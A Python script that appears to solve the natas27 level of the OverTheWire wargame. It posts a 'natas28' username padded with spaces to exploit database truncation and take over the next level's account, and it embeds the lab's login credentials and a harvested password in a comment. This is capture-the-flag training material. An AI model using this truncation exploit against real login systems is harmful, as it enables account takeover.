import requests
from string import *

username='natas27'
password='55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'
url='http://%s.natas.labs.overthewire.org/'%username
local='http://localhost:4000/www/app.php?'

session=requests.Session()
response=session.post(url,data={"username" : "natas28"+" "*59+"ball","password" : "ball"},auth=(username,password))
print response.text
print "~"*80

response=session.post(url,data={"username" : "natas28","password" : "ball"},auth=(username,password))

print response.text
print "~"*80


#JWwR438wkgTsNKBbcJoowyysdM82YjeF
